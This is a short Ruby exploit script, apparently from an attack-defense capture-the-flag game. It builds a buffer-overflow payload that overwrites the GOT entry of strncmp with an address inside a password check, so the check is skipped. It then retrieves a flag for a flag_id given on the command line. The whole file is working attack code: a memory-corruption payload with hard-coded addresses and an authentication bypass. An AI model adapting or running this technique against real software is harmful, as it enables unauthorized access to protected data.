#/usr/bin/env ruby

load __dir__ + "/spl_dsl.rb"

# Configuration
GOT_ENTRY = 0x0805d1cc    # GOT entry of strncmp
OVERRIDE = 0x0804af80     # Start of the inside of the if statement

BUF_SIZE = 1024

# Random string generator
CHARS = [('a'..'z'), ('A'..'Z'), ('0'..'9')].map { |i| i.to_a }.flatten
def rnd_str (n)
  (1..n).map { CHARS[rand(CHARS.length)] }.join
end

dum_flg = rnd_str(2)
dum_flg_id = rnd_str(20)
dum_pass = rnd_str(2)

flg_id = ARGV[0]

spl = Spl.new
ret = spl.generate do |h|
  h.v1.take h.v2, flag: dum_flg, flag_id: dum_flg_id, password: dum_pass
  h.v2.gimme h.v1, flag_id: dum_flg_id, password: dum_pass + 
    "\0" * (BUF_SIZE - dum_flg_id.length - dum_pass.length - 1 + 4 - 4) +
    [GOT_ENTRY].pack('L<') # second_person struct location
  h.v2.set OVERRIDE
  h.v3.gimme h.v4, flag_id: flg_id, password: 'pwnd'
end

puts ret
